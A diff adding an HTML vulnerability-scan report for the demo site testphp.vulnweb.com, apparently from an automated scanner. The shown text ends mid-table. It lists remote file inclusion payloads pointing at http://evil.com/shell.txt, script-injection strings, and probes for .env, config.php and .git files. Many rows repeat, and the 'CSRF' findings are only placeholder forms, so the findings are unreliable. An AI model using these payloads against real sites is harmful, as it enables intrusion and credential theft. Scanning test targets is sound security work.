@@ -1,0 +1,2017 @@
+
+    <html>
+    <head>
+        <title>Security Report for http://testphp.vulnweb.com/</title>
+        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.3/css/jquery.dataTables.css">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background-color: #f4f4f4;
+                color: #333;
+            }
+            .container {
+                margin-top: 20px;
+                padding: 20px;
+                background-color: #fff;
+                border-radius: 8px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            }
+            .header {
+                background: #333;
+                color: #fff;
+                padding: 20px;
+                border-radius: 8px 8px 0 0;
+            }
+            .header h1 {
+                margin: 0;
+            }
+            .badge {
+                font-size: 1em;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>Security Report for http://testphp.vulnweb.com/</h1>
+            </div>
+            
+            <h2>Information Gathering</h2>
+            <table id="info-table" class="table table-striped">
+                <thead>
+                    <tr>
+                        <th>Key</th>
+                        <th>Value</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    
+                    <tr>
+                        <td>status_code</td>
+                        <td>200</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>headers</td>
+                        <td>{'Server': 'nginx/1.19.0', 'Date': 'Tue, 03 Sep 2024 08:10:58 GMT', 'Content-Type': 'text/html; charset=UTF-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'X-Powered-By': 'PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1', 'Content-Encoding': 'gzip'}</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>content_type</td>
+                        <td>text/html; charset=UTF-8</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>content_length</td>
+                        <td>4958</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>response_time</td>
+                        <td>0.4853336811065674</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>meta_tags</td>
+                        <td>{}</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>internal_links</td>
+                        <td>['http://testphp.vulnweb.com/cart.php', 'http://testphp.vulnweb.com/login.php', 'http://testphp.vulnweb.com/index.php', 'http://testphp.vulnweb.com/guestbook.php', 'http://testphp.vulnweb.com/userinfo.php', 'http://testphp.vulnweb.com/Mod_Rewrite_Shop/', 'http://testphp.vulnweb.com/AJAX/index.php', 'http://testphp.vulnweb.com/categories.php', 'http://testphp.vulnweb.com/privacy.php', 'http://testphp.vulnweb.com/hpp/', 'http://testphp.vulnweb.com/artists.php', 'http://testphp.vulnweb.com/disclaimer.php']</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>external_links</td>
+                        <td>['https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/', 'https://www.acunetix.com/', 'https://www.acunetix.com/vulnerability-scanner/', 'http://www.acunetix.com', 'http://www.eclectasy.com/Fractal-Explorer/index.html', 'https://www.acunetix.com/vulnerability-scanner/php-security-scanner/', 'mailto:wvs@acunetix.com']</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>technologies</td>
+                        <td>{'Google Analytics': False, 'jQuery': False, 'Bootstrap': False}</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>wafs</td>
+                        <td>[]</td>
+                    </tr>
+                    
+                </tbody>
+            </table>
+            
+            <h2>Open Ports</h2>
+            <table id="ports-table" class="table table-striped">
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    
+                    <tr>
+                        <td>80</td>
+                    </tr>
+                    
+                </tbody>
+            </table>
+            
+            <h2>Vulnerabilities</h2>
+            <div class="row">
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>Cross-Site Request Forgery</strong> <span class="badge badge-pill badge-danger">17</span>
+                    </div>
+                </div>
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>Remote File Inclusion</strong> <span class="badge badge-pill badge-danger">17</span>
+                    </div>
+                </div>
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>Insecure Direct Object References</strong> <span class="badge badge-pill badge-danger">34</span>
+                    </div>
+                </div>
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>XSS Injection</strong> <span class="badge badge-pill badge-danger">34</span>
+                    </div>
+                </div>
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>Security Misconfiguration</strong> <span class="badge badge-pill badge-danger">51</span>
+                    </div>
+                </div>
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>SQL Injection</strong> <span class="badge badge-pill badge-danger">68</span>
+                    </div>
+                </div>
+                
+                <div class="col-md-4">
+                    <div class="alert alert-warning">
+                        <strong>Sensitive Data Exposure</strong> <span class="badge badge-pill badge-danger">40</span>
+                    </div>
+                </div>
+                
+            </div>
+            <table id="vuln-table" class="table table-striped">
+                <thead>
+                    <tr>
+                        <th>URL</th>
+                        <th>Type</th>
+                        <th>Payload</th>
+                        <th>Method</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>Cross-Site Request Forgery</td>
+                        <td><form action='http://testphp.vulnweb.com/' method='POST'><input type='hidden' name='csrf_token' value='fake_token'></form></td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=h</td>
+                        <td>Remote File Inclusion</td>
+                        <td>http://evil.com/shell.txt</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?user_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=?</td>
+                        <td>Insecure Direct Object References</td>
+                        <td>?account_id=1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>XSS Injection</td>
+                        <td>'"><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=<</td>
+                        <td>XSS Injection</td>
+                        <td><script>alert('XSS')</script></td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
